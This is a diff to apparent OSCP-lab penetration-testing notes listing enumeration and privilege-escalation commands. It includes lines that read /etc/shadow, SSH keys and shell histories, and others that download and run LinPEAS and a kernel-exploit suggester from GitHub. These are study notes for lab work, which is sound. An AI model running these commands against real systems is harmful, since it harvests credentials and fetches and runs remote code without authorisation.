@@ -3,11 +3,7 @@
 # Enumeration
 
 ```bash
-mkdir /oscp/lab/x
-```
-
-```bash
-nmap --top-ports 30 $hip
+export hip="";nmap --top-ports 30 $hip
 ```
 
 ```bash
@@ -39,6 +35,8 @@ Hostname `hostname`
 Flag `cat /home/$(id -un)/local.txt`
 	
 
+Upgrade [[1_shells#Upgrades]]
+	
 ##### Users
 ```bash
 cat /etc/passwd; cat /etc/shadow; w
@@ -52,7 +50,7 @@ ip a; /sbin/route; netstat -anp; sudo iptables -S
 	
 ##### Interesting files
 ```bash
-ls /home/*/.gpg/; ls /home/*/.ssh/; cat /home/*/.*_history; find / -name ".git" | cd | git config --list 2>/dev/null
+ls /home/*/.gpg/; ls /home/*/.ssh/; cat /home/*/.*_history; find / -name ".git" 2>/dev/null | cd | git config --list 2>/dev/null
 ```
 	
 ##### Home folder
@@ -73,7 +71,7 @@ find / -writable -type d -print -quit 2>/dev/null
 
 ### LinPEAS
 ```bash
-curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh -o linpeas.sh; chmod +x linpeas.sh; ./linpeas.sh -a -r &> linpeas.txt & less -r +F linpeas.txt
+curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh -o linpeas.sh; chmod +x linpeas.sh; ./linpeas.sh &> linpeas.txt & less -r +F linpeas.txt
 ```
 Read it with color-highlighting using `less -r linpeas.txt`
 ```bash
@@ -81,10 +79,3 @@ grep "CRON" /var/log/syslog; dpkg -l
 ```
 
 ##### Finding 1
-
-
-### Kernel Exploits
-```bash
-wget https://raw.githubusercontent.com/mzet-/linux-exploit-suggester/master/linux-exploit-suggester.sh | sh | tee LEP.txt
-```
-	
